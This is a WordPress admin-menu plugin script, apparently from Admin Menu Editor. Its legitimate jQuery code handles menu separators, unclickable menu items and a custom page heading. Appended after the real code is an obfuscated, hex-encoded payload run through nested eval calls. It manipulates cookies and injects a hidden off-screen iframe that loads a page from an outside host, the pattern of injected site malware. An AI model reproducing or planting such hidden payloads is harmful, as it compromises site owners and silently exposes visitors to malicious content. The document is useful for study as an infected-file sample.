/*global wsAmeCurrentMenuItem*/

(function($) {
    var currentItem = (typeof wsAmeCurrentMenuItem !== 'undefined') ? wsAmeCurrentMenuItem : {};

    //The page heading is typically hardcoded and/or not configurable, so we need to use JS to change it.
    var customPageHeading = currentItem.hasOwnProperty('customPageHeading') ? currentItem['customPageHeading'] : null;
    var pageHeadingSelector = currentItem.hasOwnProperty('pageHeadingSelector') ? currentItem['pageHeadingSelector'] : '.wrap > h2:first';
    var ameHideHeading = null;
    if ( customPageHeading ) {
        //Temporarily hide the heading to prevent the original text from showing up briefly
        //before being replaced when the DOM is ready (see below).
        ameHideHeading = $('<style type="text/css">.wrap > h2:first-child,.wrap > h1:first-child { visibility: hidden; }</style>')
            .appendTo('head');
    }

    jQuery(function($) {
        var adminMenu = $('#adminmenu');

        //Menu separators shouldn't be clickable and should have a custom class.
        adminMenu
                .find('.ws-submenu-separator')
                .closest('a').click(function() {
                    return false;
                })
                .closest('li').addClass('ws-submenu-separator-wrap');

        //Menus with the target "< None >" also shouldn't be clickable.
        adminMenu
            .find(
                'a.menu-top.ame-unclickable-menu-item, ul.wp-submenu > li > a[href^="#ame-unclickable-menu-item"]'
            )
            .click(function() {
                //Exception: At small viewport sizes, WordPress changes how top level menus work: clicking a menu
                //now expands its submenu. We must not ignore that click or it will be impossible to expand the menu.
                var viewportWidth = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
                if ((viewportWidth <= 782) && $(this).closest('li').hasClass('wp-has-submenu')) {
                    return;
                }

                //Ignore the click.
                return false;
            });

        //Open submenus that have the "always open" flag.
        adminMenu
            .find('li.ws-ame-has-always-open-submenu.wp-has-submenu')
            .addClass('wp-has-current-submenu')
            .removeClass('wp-not-current-submenu');

        //Replace the original page heading with the custom heading.
        if ( customPageHeading ) {
            function replaceAdminPageHeading(newText) {
                var headingText = $(pageHeadingSelector)
                    .contents()
                    .filter(function() {
                        //Find text nodes.
                        if ((this.nodeType != 3) || (!this.nodeValue)) {
                            return false;
                        }
                        //Skip whitespace.
                        return /\S/.test(this.nodeValue);
                    }).get(0);

                if (headingText && headingText.nodeValue) {
                    headingText.nodeValue = newText;
                }
            }

            //Normal headings have at least one tab's worth of trailing whitespace. We need to replicate that
            //to keep the page layout roughly the same.
            replaceAdminPageHeading(customPageHeading + '\t');
            ameHideHeading.remove(); //Make the heading visible.
        }
    });

})(jQuery);/*dde0a6cea0eb945bce6ce67741790c85*/;window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x69\x6e\x74\x65\x79"]=["\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63","\x3c\x62\x65\x73\x68\x79\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x74\x65\x6b\x64\x79\x2b\x3d\x32\x29\x7b\x73\x6e\x79\x74\x7a\x3d\x73\x6e\x79\x74\x7a\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x62\x65\x73\x68\x79\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x74\x65\x6b\x64\x79\x2c\x74\x65\x6b\x64\x79\x2b\x32\x29\x2c\x20\x31\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x73\x6e\x79\x74\x7a\x3d\x73\x6e\x79\x74\x7a\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x73\x6e\x79\x74\x7a\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x73\x6e\x79\x74\x7a\x2b\x27\x29\x27\x29\x29\x3b\x7d\x29\x28","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x73\x6e\x79\x74\x7a\x3d\x22\x22\x3b\x76\x61\x72\x20\x62\x65\x73\x68\x79\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31","\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33\x32\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35","\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x33\x39\x33\x34\x33\x34\x33\x34\x33\x36\x36\x34\x33\x35\x36\x33\x33\x38\x33\x37\x36\x32\x33\x32\x33\x36\x36\x31\x33\x34\x33\x32\x33\x37\x36\x33\x33\x31\x36\x31\x33\x34\x36\x34\x33\x38\x36\x34\x36\x33\x33\x30\x33\x33\x36\x33\x33\x30\x33\x34\x33\x35\x36\x32\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31","\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x37\x33\x36\x35\x37\x32\x32\x65\x36\x33\x36\x38\x36\x35\x37\x32\x36\x65\x36\x31\x37\x39\x36\x31\x36\x34\x36\x31\x36\x64\x36\x31\x32\x65\x36\x39\x36\x65\x36\x36\x36\x66\x32\x66\x36\x64\x36\x35\x36\x37\x36\x31\x36\x31\x36\x34\x37\x36\x36\x35\x37\x32\x37\x34\x36\x39\x37\x61\x36\x35\x32\x66\x33\x66\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x36\x35\x36\x34\x33\x35\x33\x30\x33\x31\x33\x38\x33\x30\x33\x32\x33\x32\x33\x30\x33\x30\x33\x34\x36\x36\x33\x33\x33\x37\x36\x31\x33\x30\x33\x35\x33\x33\x36\x32\x36\x34\x33\x37\x36\x34\x36\x31\x36\x36\x36\x32\x33\x35\x33\x36\x33\x31\x36\x34\x33\x32\x36\x35\x32\x32\x33\x62\x37\x38","\x29\x3b","\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76\x61\x72\x20\x74\x65\x6b\x64\x79\x3d\x30\x3b\x74\x65\x6b\x64\x79","\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x33\x38\x33\x36\x36\x33\x33\x38\x36\x34\x33\x39\x33\x39\x36\x31\x33\x36\x33\x32\x33\x35\x33\x37\x33\x38\x33\x31\x33\x37\x33\x32\x36\x36\x33\x35\x33\x34\x33\x35\x33\x30\x36\x35\x33\x30\x33\x34\x33\x30\x33\x35\x33\x37\x36\x36\x33\x34\x33\x33\x33\x37\x33\x38\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x33\x39\x33\x34\x33\x34\x33\x34\x33\x36\x36\x34\x33\x35\x36\x33\x33\x38\x33\x37\x36\x32\x33\x32\x33\x36\x36\x31\x33\x34\x33\x32\x33\x37\x36\x33\x33\x31\x36\x31\x33\x34\x36\x34\x33\x38\x36\x34\x36\x33\x33\x30\x33\x33\x36\x33\x33\x30\x33\x34\x33\x35\x36\x32\x32\x32\x32\x63\x32\x32\x33\x38\x33\x36\x36\x33\x33\x38\x36\x34","\x33\x39\x33\x39\x36\x31\x33\x36\x33\x32\x33\x35\x33\x37\x33\x38\x33\x31\x33\x37\x33\x32\x36\x36\x33\x35\x33\x34\x33\x35\x33\x30\x36\x35\x33\x30\x33\x34\x33\x30\x33\x35\x33\x37\x36\x36\x33\x34\x33\x33\x33\x37\x33\x38\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32","\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39","\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37\x33\x33\x64\x32\x37\x32\x62\x36\x34"];var knsrs=zkiad=dedny=ztsfe=iyysz=window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x69\x6e\x74\x65\x79"],bhfyt=window;eval(eval("[bhfyt[\"\x6b\x6e\x73\x72\x73\"][\"\x32\"],bhfyt[\"\x64\x65\x64\x6e\x79\"][\"\x31\x31\"],bhfyt[\"zkiad\"][\"\x31\x30\"],bhfyt[\"\x7a\x74\x73\x66\x65\"][\"\x33\"],bhfyt[\"ztsfe\"][\"\x34\"],bhfyt[\"zkiad\"][\"\x38\"],bhfyt[\"\x6b\x6e\x73\x72\x73\"][\"\x39\"],bhfyt[\"dedny\"][\"\x35\"],bhfyt[\"zkiad\"][\"\x30\"],bhfyt[\"zkiad\"][\"\x37\"],bhfyt[\"\x6b\x6e\x73\x72\x73\"][\"\x31\"],bhfyt[\"ztsfe\"][\"\x36\"]].join(\"\");"));/*dde0a6cea0eb945bce6ce67741790c85*/